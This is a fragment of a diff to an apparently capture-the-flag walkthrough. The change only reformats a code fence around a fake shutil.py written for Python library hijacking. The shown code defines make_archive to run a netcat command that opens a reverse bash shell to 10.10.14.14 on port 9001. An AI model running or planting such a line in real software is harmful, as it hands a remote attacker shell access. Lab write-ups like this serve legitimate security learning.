@@ -231,7 +231,8 @@ I try to write the shutil.py script with nano to get a reverse shell back in the
 
 `nano shutil.py`
 
-```import os, socket, subprocess
+```
+import os, socket, subprocess
 
 def make_archive(a , b, c):
 os.system("nc -c bash 10.10.14.14 9001")
